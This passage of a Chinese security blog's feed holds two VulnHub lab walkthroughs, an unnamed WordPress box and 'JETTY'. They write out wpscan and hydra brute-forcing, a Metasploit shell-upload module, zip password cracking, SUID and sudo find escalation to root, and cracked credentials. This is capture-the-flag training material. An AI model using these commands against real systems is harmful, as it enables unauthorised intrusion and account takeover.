 &lt;code&gt;wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://wp.looz.com/ -U john,william,james,evelyn,mason,harper,gandalf - P /usr/share/wordlists/rockyou.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1110.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;最终得到了用户 gandalf 的密码 loveme2,&lt;/p&gt;
&lt;h3 id=&#34;wp_admin_shell_upload-使用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wp_admin_shell_upload-使用&#34;&gt;#&lt;/a&gt; wp_admin_shell_upload 使用&lt;/h3&gt;
&lt;p&gt;目前得到了 wp 站点的两组账号，在 msf 中有一个 wp_admin_shell_upload 的模块，可根据已有账号反弹 shell，用这两个模块尝试反弹 shell&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;use exploit/unix/webapp/wp_admin_shell_upload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set password loveme2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rhosts wp.looz.com&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set username gandalf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set targeturi /&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1111.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;很遗憾，gandalf 用户反弹是失败的，继续用 john 用户测试该站点&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;use exploit/unix/webapp/wp_admin_shell_upload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set password y0uC@n\&amp;#x27;tbr3akIT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rhosts wp.looz.com&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set username john&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set targeturi /&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set password y0uC@n\&amp;#x27;tbr3akIT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注意 msf 中使用单引号时需要在其前面加反斜杠转义&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1112.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;但是仍然没有 shell 反弹出来，目前我们知道的仍然只是两组用户，还没有利用价值&lt;/p&gt;
&lt;h3 id=&#34;dig-判断站点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dig-判断站点&#34;&gt;#&lt;/a&gt; dig 判断站点&lt;/h3&gt;
&lt;p&gt;判断一下网站是否存在其他的站点  &lt;code&gt;dig wp.looz.com @192.168.31.80&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1113.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;很遗憾也没有其他站点，接下来可以看看后台怎么用，有没有可以操作的地方，找到一个可以上传文件的地方，我们直接上传 php 木马看有没有效果&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1114.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;很遗憾，这个地方也上传失败了&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1115.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;密码破解&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#密码破解&#34;&gt;#&lt;/a&gt; 密码破解&lt;/h3&gt;
&lt;p&gt;接下来就需要爆破了，爆破用户名和密码，用户名可以选用前期通过 wpscan 得到的几个用户名，密码选用一个比较全的字典。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;hydra -l gandalf -P /usr/share/wordlists/rockyou.txt 192.168.31.80 ssh -t 64 -f -vV -o hydra.ssh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;要是自己破解不知道要破解到猴年马月，而且在实际测试中受制于防守方部署的 IDS、IPS 我们没法使用 hydra 暴力测试，这里我看了相关作者的文档，利用 gandalf 进行了破解密码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1116.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 得到 gandalf 的密码 highschoolmusical&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ssh 192.168.31.80 -l gandalf&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1117.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;suid-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#suid-提权&#34;&gt;#&lt;/a&gt; suid 提权&lt;/h3&gt;
&lt;p&gt;拿到服务器后，搜索到了一个 s 权限的文件  &lt;code&gt;find / -perm -u=s -type f 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1118.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用 strings 检查了一下并没有发现封装什么特殊的命令，可能是作者自己封装的一个命令，没有头绪怎么处理这个文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1119.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;既然是可执行文件，就去执行&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1120.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 拿到了 root 的 shell&lt;/p&gt;
</content>
        <category term="VULNHUB 31-40" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/132%20JETTY/</id>
        <title>VULNHUB 32 JETTY</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/132%20JETTY/"/>
        <content type="html">&lt;p&gt;靶机下载地址:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvamV0dHktMSw2MjEv&#34;&gt;https://www.vulnhub.com/entry/jetty-1,621/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTkyMjI3OC9hcnRpY2xlL2RldGFpbHMvMTEzNzA1Mjgx&#34;&gt;https://blog.csdn.net/weixin_45922278/article/details/113705281&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 JETTY：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-829.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.66&lt;/p&gt;
&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -A -p- 192.168.31.66&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-830.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 21,80&lt;/p&gt;
&lt;h3 id=&#34;ftp-弱口令及下载&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ftp-弱口令及下载&#34;&gt;#&lt;/a&gt; FTP 弱口令及下载&lt;/h3&gt;
&lt;p&gt;先从 ftp 进行下手&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-831.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;尝试弱口令登陆成功，看到 ftp 服务中存在两个文件，用 lcd 来在 ftp 服务中控制 kali 的目录，下载文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-832.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看下载下来的两个文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-833.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;其中 README.txt 中给了 Henry、Michael 的用户名，解压 sshpass.zip 的时候发现其是有密码认证的&lt;/p&gt;
&lt;h3 id=&#34;zip加密破解&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#zip加密破解&#34;&gt;#&lt;/a&gt; zip 加密破解&lt;/h3&gt;
&lt;p&gt;破解 zip  &lt;code&gt;fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt sshpass.zip&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-834.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;也可以使用 zip2john 将加密的 zip 转化为可以用 john 破解的&lt;/p&gt;
&lt;p&gt;&lt;code&gt;zip2join sshpass.zip &amp;gt; ssh.txt&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;john ssh.txt –wordlist=/usr/share/wordlists/rockyou.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-835.png&#34; width=&#34;680&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;得到 zip 的密码为 seahorse！进行解压&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-836.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 解压后即得到了 ssh 的密码&lt;/p&gt;
&lt;p&gt;到目前为止我们已经得到了 ssh 的一个疑似账户 Henry 和一个 ssh 密码&lt;br&gt;
但是我们扫描端口时并没有发现 ssh 协议是开启的，还需要其他的信息收集&lt;/p&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNjY=&#34;&gt;http://192.168.31.66&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-837.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;识别目录，看能否找到更多的目录信息&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-838.png&#34; width=&#34;360&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNjYvcm9ib3RzLnR4dA==&#34;&gt;http://192.168.31.66/robots.txt&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;发现了四个目录，依次访问之后没有发现&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-839.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;到此为止，我们的信息收集工作就做完了，但是仍然还有个问题，为什么没有开启 ssh 协议，是不是之前识别的结果有问题？还有就是 ssh 用户名只有这一个吗，还有没有其他的可能的用户名。带着问题去看 vulnhub 上给出的提示，发现了一个用户名 Squiddie。&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-840.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;hydra-爆破-ssh&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra-爆破-ssh&#34;&gt;#&lt;/a&gt; hydra 爆破 ssh&lt;/h3&gt;
&lt;p&gt;其次，用 nmap 再次更详细的扫描一下端口，看能否扫描到 ssh 协议&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-841.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;经过这一次的扫描，扫描到了 65507 端口开放的是 ssh 协议可能因为这个端口在比较靠后的位置，并且不是常用的端口，所以第一次扫描的时候并没有扫到&lt;/p&gt;
&lt;p&gt;003 hydra 指定端口爆破，find 提权&lt;/p&gt;
&lt;p&gt;现在我门就通过 hydra 爆破 65507 端口处的 ssh 协议，并且指定用户名为 Henry、Michael、Squiddie 以及这三个及首字母变为小写的三个，密码为爆破 zip 之后解压出来的密码&lt;br&gt;
 &lt;code&gt;hydra -L user.txt -P sshpass.txt ssh://192.168.31.66 -f -t 4 -I -s 65507 -vV -o hydra.ssh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;得到密码并连接&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-843.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;ssh &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOnNxdWlkZGllQDE5Mi4xNjguMzEuNjY=&#34;&gt;squiddie@192.168.31.66&lt;/span&gt; -p 65507&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-844.png&#34; width=&#34;630&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 连接成功&lt;/p&gt;
&lt;h3 id=&#34;sudofind-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudofind-提权&#34;&gt;#&lt;/a&gt; sudo (find) 提权&lt;/h3&gt;
&lt;p&gt;靶机里边装了一个 python2 的命令，输入 python2 打开其命令行&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;import pty&lt;br&gt;
pty.spawn(&amp;quot;/bin/bash&amp;quot;)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-846.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;得到一个标准的 shell&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;sudo -l 时发现了可以无密码调用 root 的 find 命令，利用 find 提权&lt;br&gt;
 sudo find. -exec /bin/sh ; -quit&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-847.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到了 root 权限&lt;/p&gt;
&lt;h3 id=&#34;架构不支持处理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#架构不支持处理&#34;&gt;#&lt;/a&gt; 架构不支持处理&lt;/h3&gt;
&lt;p&gt;此靶机的目标是找到犯罪证据，还需进一步的深入测试，查看定时任务  &lt;code&gt;crontab -l&lt;/code&gt;  发现有一个备份文件一直在执行，此命令就是做一个备份，跟踪找到这个.docs 的文件夹查看内容&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-848.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;这里有几个 xlsx 的文件以及一个文件夹，也许这几个文件就是犯罪证据，我们将这些文件都发送到 kali 机器上，用 scp/ftp/python 等方式进行传输&lt;br&gt;
 scp -r * &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOnBhcmFsbGVsc0AxOTIuMTY4LjMxLjY1&#34;&gt;parallels@192.168.31.65&lt;/span&gt;:~/Desktop/tool/jetty/doc/&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-849.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;Kali 机器接受到文件之后，直接双击打开这些 xlsx 的文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-850.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;错误内容显示架构不支持，因为此 kali 机器是在 mac M1 上虚拟出来的虚拟机，是 arm 架构的 kali，所以有些东西是没有兼容的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-851.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;并且 Password_kepper 文件夹中有一个 exe 的 windows 上才能执行的可执行文件，是需要发到 windows 机器上才能运行的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-852.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这个地方我再次通过 scp 将这些文件都传输到了一般用的 amd 的 windows 机器&lt;br&gt;
 &lt;code&gt;ping 192.168.31.91&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;scp -r * administrator@192.168.31.91:/E:/Desktop/doc/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-853.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;传输成功，结果如下图&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-854.png&#34; width=&#34;630&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;xlsx 文件需要密码才能解开&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-855.png&#34; width=&#34;430&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;运行 exe 文件，发现有个选项可以查看密码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-856.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;大致浏览了一下所有的信息之后，发现这个 exe 文件是用 pyinstaller 编译出来的，既然如此，接下来我们的目标就是去反编译这个 exe 文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-857.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;uncompyle6-反编译-pyc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#uncompyle6-反编译-pyc&#34;&gt;#&lt;/a&gt; uncompyle6 反编译 pyc&lt;/h3&gt;
&lt;p&gt;下载在 github 上用于反编译 pyinstaller 生成的文件的工具 pyinstxtractor&lt;br&gt;
 &lt;code&gt;wget https://github.com/extremecoders-re/pyinstxtractor.git&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;Python2 pyinstxtractor.py password_keeper.exe&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-858.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看执行效果&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-859.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;执行之后会在 pyinstxtractor.py 同目录下生成一个文件夹，产生一个 password_keeper.exe_extracted 目录，在目录下找到关键 pyc 文件也就是 password_keeper.pyc，再将这个文件反编译。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;使用 uncompyle6 反编译 pyc 文件&lt;br&gt;
安装 uncompyle  &lt;code&gt;pip install uncompyle&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-860.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;反编译 pyc 文件  &lt;code&gt;uncompyle6 .\password_keeper.pyc &amp;gt; password_keeper.py&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-861.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;调查取证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#调查取证&#34;&gt;#&lt;/a&gt; 调查取证&lt;/h3&gt;
&lt;p&gt;对得到的代码进行代码审计&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-862.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;总结功能大概如下，我们输入选项之后，需要我们输入一个密钥，将此密钥进行 base64 加密后与代码中的 key 进行比对，如果是相同的就会输出密码&lt;/p&gt;
&lt;p&gt;先进行 base64 解密 &lt;code&gt;echo “N2FlMjE4ZmYyOTI4ZjZiMg==” ｜ base64 -d&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-863.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;运行 exe 文件，输入 1，然后输入解密后的密钥 7ae218ff2928f6b2&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-864.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;得到了五个密码，分别是这五个 xlsx 的密码&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-865.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 成功拿到犯罪证据&lt;/p&gt;
</content>
        <category term="VULNHUB 31-40" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
</feed>
